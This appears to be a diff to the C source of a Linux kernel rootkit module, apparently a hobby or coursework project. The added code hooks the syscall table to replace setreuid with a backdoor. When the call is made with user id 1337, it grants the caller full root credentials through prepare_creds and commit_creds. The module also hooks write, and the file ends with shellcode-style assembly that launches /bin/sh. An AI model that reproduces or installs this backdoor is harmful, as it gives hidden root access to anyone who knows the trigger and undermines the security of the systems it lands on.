@@ -7,6 +7,18 @@
 #include <linux/syscalls.h>
 #include <linux/string.h>
 #include <linux/slab.h>
+#include <linux/unistd.h> 
+#include <linux/cred.h>
+
+//these are from the website, some may be unncecessary
+#include <linux/errno.h>
+#include <linux/version.h>
+#include <asm/cacheflush.h>
+#include <asm/page.h>
+#include <linux/sched.h>
+#include <linux/kallsyms.h>
+
+
 
 int rkit_init(void);
 void rkit_exit(void);
@@ -48,18 +60,35 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
     kfree(kbuff);
     return r;
 }
-//This is the basic method that we will overwrite the default setreuid with 
+//This is the basic method that we will overwrite the default setreuid.
+//You can test it by using the rkitTest/test.c file. 
+//$ gcc test.c -o test
 asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid){
-    int r
+    int r;
+    struct cred *new;
+    //this is our condition we need to meet to activate the root shell
     if (ruid == 1337 && euid == 1337){
-        //make the custom terminal 
-    }
+        //if the condition is met, check dmesg to see if this is there 
+        printk("rkitmod works. 1337 called");
 
-    else {
-    r = (*o_setreuid)(ruid,euid)
+        //makes the new credentials we need for the shell 
+        new = prepare_creds();
+        
+        if ( new != NULL ) {
+            //0s are root. root for everything
+            new->uid = new->gid = 0;
+            new->euid = new->egid = 0;
+            new->suid = new->sgid = 0;
+            new->fsuid = new->fsgid = 0;
+            //commit the credentils 
+            commit_creds(new);
+            return EEXIST;
+        }
+        //spawn a new shell 
+        //system ("/bin/sh");
     }
-
-    return r 
+    r = (*o_setreuid)(ruid,euid);
+    return r;
 }
 
 int rkit_init(void) {
@@ -79,7 +108,7 @@ int rkit_init(void) {
     o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
     //this overrides the current setreuid in the table with our modded version
     //possibly__NR_setreuid64 instead of __NR_setreuid32?
-    o_mod = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)rkit_setreuid);
+    o_setreuid = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)rkit_setreuid);
     write_cr0(read_cr0() | 0x10000);
 
     return 0;
@@ -115,3 +144,4 @@ mov eax,11
 lea eex, ebx+8 
 lea edu ebx+12 <- /bin/sh 
 int 0x80 
+*/
